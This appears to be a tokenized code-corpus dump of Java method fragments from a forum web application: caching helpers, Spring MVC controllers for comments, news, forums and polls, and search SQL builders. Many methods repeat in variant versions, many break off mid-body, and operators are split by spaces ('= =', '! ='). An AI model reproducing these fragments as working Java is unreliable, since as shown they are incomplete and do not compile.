public String get ( SearchViewer viewer , boolean nocache ) throws SQLException , UserErrorException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( ) ) ; String res = null ; if ( ! nocache ) { time = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . getFromCache ( cacheId ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = true ; } if ( res = = null ) { Connection db = null ; try { long current = new Date ( ) . getTime ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public ModelAndView showComments ( @RequestParam String nick , @RequestParam ( defaultValue = " 0 " ) int offset , HttpServletResponse response ) throws Exception { ModelAndView mv = new ModelAndView ( " show-comments " ) ; int topics = 50 ; mv . getModel ( ) . put ( " topics " , topics ) ; if ( offset < 0 ) { throw new ServletParameterException ( " offset<0!? " ) ; } mv . getModel ( ) . put ( " offset " , offset ) ; boolean firstPage = offset = = 0 ; if ( firstPage ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 90 * 1000 ) ; } else { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 60 * 1000L ) ; } mv . getModel ( ) . put ( " firstPage " , firstPage ) ; Connection db = null ; String showCommentsId = MemCachedSettings . getId ( " show-comments?id= " + URLEncoder . encode ( nick ) + " &offset= " + offset ) ; try { db = LorDataSource . getConnection ( ) ; 
public < T > boolean storeToCache ( String key , T value , int expire ) { String s = MemCachedSettings . getId ( key ) ; return MemCachedSettings . getMemCachedClient ( ) . set ( s , value , expire ) ; } 
public < T > boolean storeToCache ( String key , T value ) { String s = MemCachedSettings . getId ( key ) ; return MemCachedSettings . getMemCachedClient ( ) . set ( s , value , 0 ) ; } 
Object getFromCache ( String key ) ; < T > void storeToCache ( String key , T value , int expire ) ; < T > void storeToCache ( String key , T value ) ; } 
< T > void storeToCache ( String key , T value , int expire ) ; < T > void storeToCache ( String key , T value ) ; } 
public < T > void storeToCache ( String key , T value ) { storeToCache ( key , value , 0 ) ; } 
public ModelAndView showComments ( @RequestParam String nick , @RequestParam ( defaultValue = " 0 " ) int offset , HttpServletResponse response ) throws Exception { ModelAndView mv = new ModelAndView ( " show-comments " ) ; int topics = 50 ; mv . getModel ( ) . put ( " topics " , topics ) ; if ( offset < 0 ) { throw new ServletParameterException ( " offset<0!? " ) ; } mv . getModel ( ) . put ( " offset " , offset ) ; boolean firstPage = offset = = 0 ; if ( firstPage ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 90 * 1000 ) ; } else { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 60 * 1000L ) ; } mv . getModel ( ) . put ( " firstPage " , firstPage ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static User getUser ( Connection con , String name ) throws SQLException , UserNotFoundException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; User user = new User ( con , name ) ; String cacheId = " User?id= " + user . id ; mcc . storeToCache ( cacheId , user , CACHE_MILLIS ) ; return user ; } 
private static User getUser ( Connection db , int id , boolean useCache ) throws SQLException , UserNotFoundException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = " User?id= " + id ; User res = null ; if ( useCache ) { res = ( User ) mcc . getFromCache ( cacheId ) ; } if ( res = = null ) { res = new User ( db , id ) ; mcc . storeToCache ( cacheId , res , CACHE_MILLIS ) ; } return res ; } 
public String get ( SearchViewer viewer , boolean nocache ) throws SQLException , UserErrorException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = viewer . getVariantID ( ) ; String res = null ; if ( ! nocache ) { time = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . getFromCache ( cacheId ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = true ; } if ( res = = null ) { Connection db = null ; try { long current = new Date ( ) . getTime ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public boolean evaluate ( Object o ) { return isBox ( ( String ) o ) ; } 
public boolean isResolvable ( ) { return resolvable ; } 
public void resolveMessage ( Connection db , boolean b ) throws SQLException { PreparedStatement pstMsgbase = db . prepareStatement ( " UPDATE topics SET resolved=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " ) ; pstMsgbase . setBoolean ( 1 , b ) ; pstMsgbase . setInt ( 2 , msgid ) ; pstMsgbase . executeUpdate ( ) ; } 
public String get ( SearchViewer viewer , boolean nocache ) throws SQLException , UserErrorException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = viewer . getVariantID ( ) ; String res = null ; if ( ! nocache ) { time = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . getFromCache ( cacheId ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = true ; } if ( res = = null ) { Connection db = null ; try { long current = new Date ( ) . getTime ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; time = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , 15 * 60 * 1000 ) ; } return res ; } 
private static void createReplyTo ( Integer replyTo , Map < String , Object > params , Connection db ) throws SQLException , MessageNotFoundException , AccessViolationException { if ( replyTo ! = null & & replyTo > 0 ) { Comment onComment = new Comment ( db , replyTo ) ; 
private static String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; form . setOutputLorcode ( true ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " tex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
private ModelAndView prepareModel ( Connection db , Message message ) throws SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( editInfoList ! = null ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public ModelAndView loginForm ( ) { return new ModelAndView ( " login-form " ) ; } 
public ModelAndView activateForm ( ) { return new ModelAndView ( " activate " ) ; } 
public ModelAndView showNews ( @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " section " , required = false ) Integer sectionid , @RequestParam ( value = " group " , required = false ) Integer groupid , @RequestParam ( value = " tag " , required = false ) String tag , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " view-news.jsp " ) ; StringBuilder urlParams = new StringBuilder ( ) ; if ( sectionid ! = null ) { urlParams . append ( " section= " + Integer . toString ( sectionid ) ) ; } if ( tag ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " tag= " + URLEncoder . encode ( tag ) ) ; } if ( groupid ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " group= " + Integer . toString ( groupid ) ) ; } params . put ( " params " , urlParams ) ; Connection db = null ; try { if ( month = = null ) { 
public ModelAndView showUserTopicsNew ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " /people/ " + nick + '/' ) ; params . put ( " whoisLink " , " /people/ " + nick + '/' + " profile " ) ; TODO params.put("archiveLink", "/people/"+nick+"/archive/"); Connection db = null; try { response.setDateHeader("Expires", System.currentTimeMillis() + 60 * 1000); 
public View showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " output " , required = false ) String output ) { if ( output ! = null ) { return new RedirectView ( " /people/ " + nick + " /?output=rss " ) ; } return new RedirectView ( " /people/ " + nick + '/' ) ; } 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) throws Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . toString ( offset ) ) ; } if ( year ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . toString ( year ) + '/' + Integer . toString ( month ) ) ; } if ( groupId ! = null ) { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; Group group = new Group ( db , groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + '/' ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public ModelAndView galleryArchive ( @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( month , year , Section . getSection ( section ) , null , null , null , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public List < User > getNewUsers ( Connection db ) throws SQLException , UserNotFoundException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT id FROM users where regdate IS NOT null " + " AND regdate > CURRENT_TIMESTAMP - interval '3 days' ORDER BY regdate " ) ; List < User > list = new ArrayList < User > ( ) ; while ( rs . next ( ) ) { list . add ( User . getUser ( db , rs . getInt ( " id " ) ) ) ; } st . close ( ) ; return list ; } 
public ModelAndView removeUserpic ( HttpServletRequest request , @RequestParam ( " id " ) int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not autorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private GalleryItem createGalleryItem ( ResultSet rs ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = properties . getProperty ( " HTMLPathPrefix " ) ; item . setHtmlPath ( htmlPath ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) throws SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setUrl ( Section . getSectionLink ( rs . getInt ( " section " ) ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " title " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; return result ; } 
private static void check ( String domain , String msgid ) throws StorageException { if ( ! DOMAIN_CHECK_RE . isMatch ( domain ) ) { throw new StorageBadDomainException ( domain ) ; } if ( ! NAME_CHECK_RE . isMatch ( msgid ) ) { throw new StorageBadMsgidException ( msgid ) ; 
public static String readfile ( String filename ) throws IOException { StringBuilder out = new StringBuilder ( ) ; BufferedReader in = new BufferedReader ( new InputStreamReader ( new FileInputStream ( filename ) , " KOI8-R " ) ) ; char [ ] buf = new char [ 8192 ] ; int i ; while ( ( i = in . read ( buf , 0 , buf . length ) ) > - 1 ) { if ( i > 0 ) { out . append ( buf , 0 , i ) ; } } in . close ( ) ; return out . toString ( ) ; } 
public boolean setBoolean ( String prop , String value ) throws UtilException { if ( value = = null ) { return setBoolean ( prop , false ) ; } if ( " on " . equals ( value ) ) { return setBoolean ( prop , true ) ; } return false ; } 
public String next ( ) { if ( ! hasNext ( ) ) { throw new NoSuchElementException ( ) ; } if ( str . charAt ( index ) = = '&' ) { StringBuilder buf = new StringBuilder ( ) ; 
public String show ( Connection db ) throws SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 | | ( userTopic & & username . length ( ) > 0 ) ) { select . append ( " , topics " ) ; } if ( section ! = 0 ) { select . append ( " , groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; if ( userTopic ) { select . append ( " AND topics.userid= " ) . append ( user . getId ( ) ) ; select . append ( " AND topics.id = topic " ) ; } else { select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
public ModelAndView showForm ( HttpSession session , HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; if ( ! Template . isSessionAuthorized ( session ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Template tmpl = Template . getTemplate ( request ) ; params . put ( " msgid " , msgid ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView deleteComments ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , defaultValue = " 0 " ) int bonus , HttpSession session ) throws Exception { if ( bonus < 0 | | bonus > 20 ) { throw new BadParameterException ( " incorrect bonus value " ) ; } if ( ! Template . isSessionAuthorized ( session ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid , HttpSession session ) throws Exception { if ( ! Template . isSessionAuthorized ( session ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView deleteMessage ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , defaultValue = " 0 " ) int bonus , HttpServletRequest request ) throws Exception { HttpSession session = request . getSession ( ) ; if ( ! Template . isSessionAuthorized ( session ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public User getCurrentUser ( Connection db ) throws SQLException , UserNotFoundException { if ( ! isSessionAuthorized ( ) ) { return null ; } if ( currentUser ! = null ) { return currentUser ; } currentUser = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; return currentUser ; } 
public static User getCurrentUser ( Connection db , HttpSession session ) throws SQLException , UserNotFoundException { if ( ! isSessionAuthorized ( session ) ) { return null ; } return User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; } 
public static int getId ( Connection db , int userid , int topic ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT id FROM memories WHERE userid= " + userid + " AND topic= " + topic ) ; if ( ! rs . next ( ) ) { return 0 ; 
public View add ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public View remove ( HttpServletRequest request , @RequestParam ( " id " ) int id ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_POLLS , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNew ( int section , WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , int page , String filter , String groupName , int msgid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void initCurrentUser ( Connection db ) throws UserNotFoundException , SQLException { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null ) { return ; } currentUser = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; } 
public User getCurrentUser ( ) throws SQLException , UserNotFoundException { if ( ! isSessionAuthorized ( ) ) { return null ; } if ( currentUser = = null ) { throw new IllegalStateException ( " currentUser==null!? Please call initCurrentUser() first " ) ; } return currentUser ; } 
public ModelAndView showController ( @RequestParam ( " msgid " ) int msgid , HttpServletRequest request ) throws Exception { Connection db = null ; Template tmpl = Template . getTemplate ( request ) ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView deleteComments ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , defaultValue = " 0 " ) int bonus , HttpSession session , HttpServletRequest request ) throws Exception { if ( bonus < 0 | | bonus > 20 ) { throw new BadParameterException ( " incorrect bonus value " ) ; } if ( ! Template . isSessionAuthorized ( session ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( @RequestParam ( " msgid " ) int msgid , HttpSession session , HttpServletRequest request ) throws Exception { if ( ! Template . isSessionAuthorized ( session ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView deleteMessage ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , defaultValue = " 0 " ) int bonus , HttpServletRequest request ) throws Exception { HttpSession session = request . getSession ( ) ; if ( ! Template . isSessionAuthorized ( session ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static List < PreparedComment > prepare ( Connection db , CommentList comments , List < Comment > list ) throws UserNotFoundException , SQLException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( new PreparedComment ( db , comments , comment ) ) ; } return commentsPrepared ; } 
private static void createReplyTo ( Integer replyTo , Map < String , Object > params , Connection db ) throws SQLException , MessageNotFoundException , AccessViolationException , UserNotFoundException { if ( replyTo ! = null & & replyTo > 0 ) { Comment onComment = new Comment ( db , replyTo ) ; 
public ModelAndView showEditInfo ( @PathVariable ( " id " ) int msgid ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private static String getProcessedMessage ( Connection db , Comment comment ) throws SQLException { if ( comment . isLorcode ( ) ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; 
public int saveNewMessage ( Connection db , String remoteAddr , String userAgent , String message ) throws SQLException { PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; try { allocation MSGID 
private static String getProcessedMessage ( Connection db , Comment comment ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT message, bbcode FROM msgbase WHERE id= " + comment . getId ( ) ) ; rs . next ( ) ; String text = rs . getString ( " message " ) ; boolean bbcode = rs . getBoolean ( " bbcode " ) ; rs . close ( ) ; st . close ( ) ; if ( bbcode ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; 
private static String getProcessedMessage ( Connection db , Comment comment , String message ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; return proc . preparePostText ( db , message ) ; } 
private static String getProcessedMessage ( Connection db , String message ) throws SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; return proc . preparePostText ( db , message ) ; } 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Template tmpl = Template . getTemplate ( request ) ; boolean showDeleted = request . getParameter ( " deleted " ) ! = null ; params . put ( " showDeleted " , showDeleted ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView forumArchive ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @PathVariable int year , @PathVariable int month , HttpServletRequest request ) throws Exception { return forum ( groupName , offset , false , request , year , month ) ; } 
public ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request ) throws Exception { return forum ( groupName , offset , lastmod , request , null , null ) ; } 
private ModelAndView forum ( @PathVariable ( " group " ) String groupName , @RequestParam ( defaultValue = " 0 " , value = " offset " ) int offset , @RequestParam ( defaultValue = " false " ) boolean lastmod , HttpServletRequest request , Integer year , Integer month ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Template tmpl = Template . getTemplate ( request ) ; boolean showDeleted = request . getParameter ( " deleted " ) ! = null ; params . put ( " showDeleted " , showDeleted ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private int getArchiveCount ( Connection db , int groupid , int year , int month ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT c FROM monthly_stats WHERE groupid= " + groupid + " AND year= " + year + " AND month= " + month ) ; if ( ! rs . next ( ) ) { return 0 ; 
public ModelAndView archiveList ( int sectionid ) throws Exception { return archiveList ( sectionid , null ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView forumArchive ( @PathVariable String group ) throws Exception { return archiveList ( Section . SECTION_FORUM , group ) ; } 
public View galleryArchiveOld ( @RequestParam ( " section " ) int id , HttpServletResponse response ) throws Exception { String link = Section . getArchiveLink ( id ) ; if ( link = = null ) { response . sendError ( 404 , " No archive for this section " ) ; return null ; } return new RedirectView ( link ) ; } 
public boolean isMultiSelect ( ) { return multiSelect ; } 
public ModelAndView editVote ( HttpServletRequest request , @RequestParam int msgid , @RequestParam int id , @RequestParam String title , @RequestParam ( defaultValue = " false " ) boolean multiSelect ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public ModelAndView vote ( ServletRequest request , @RequestParam ( " vote " ) int [ ] votes , @RequestParam ( " voteid " ) int voteid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public Poll get ( ) throws Exception { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public Message get ( ) throws SQLException , MessageNotFoundException { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
protected < T > T getFromCache ( CacheProvider cacheProvider , GetCommand < T > callback ) throws Exception { return getFromCache ( cacheProvider , getCacheKey ( ) , callback ) ; } 
protected < T > T getFromCache ( CacheProvider cacheProvider , String key , GetCommand < T > callback ) throws Exception { @SuppressWarnings ( " unchecked " ) T result = ( T ) cacheProvider . getFromCache ( key ) ; if ( result = = null ) { result = callback . get ( ) ; cacheProvider . storeToCache ( key , result , getExpiryTime ( ) ) ; } return result ; } 
public static int createPoll ( Connection db , List < String > pollList , boolean multiSelect ) throws SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, multiselect) values (?,?) " ) ; pst . setInt ( 1 , voteid ) ; pst . setBoolean ( 2 , multiSelect ) ; pst . executeUpdate ( ) ; try { Poll poll = new Poll ( db , voteid ) ; for ( String variant : pollList ) { if ( variant . trim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } } catch ( PollNotFoundException ex ) { throw new RuntimeException ( ex ) ; } return voteid ; } 
public static List < PreparedComment > prepare ( Connection db , CommentList comments , List < Comment > list ) throws UserNotFoundException , SQLException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( new PreparedComment ( db , comments , comment ) ) ; } return commentsPrepared ; } 
public ModelAndView showUserFavs ( @PathVariable String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " /people/ " + nick + " /favs " ) ; params . put ( " whoisLink " , " /people/ " + nick + '/' + " profile " ) ; Connection db = null ; try { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public ModelAndView mainPage ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { if ( tmpl . isSessionAuthorized ( ) ) { 
public String show ( Connection db ) throws SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 | | ( userTopic & & username . length ( ) > 0 ) ) { select . append ( " , topics " ) ; } if ( section ! = 0 ) { select . append ( " , groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND not msgs.deleted AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; if ( userTopic ) { select . append ( " AND topics.userid= " ) . append ( user . getId ( ) ) ; select . append ( " AND topics.id = topic " ) ; } else { select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement 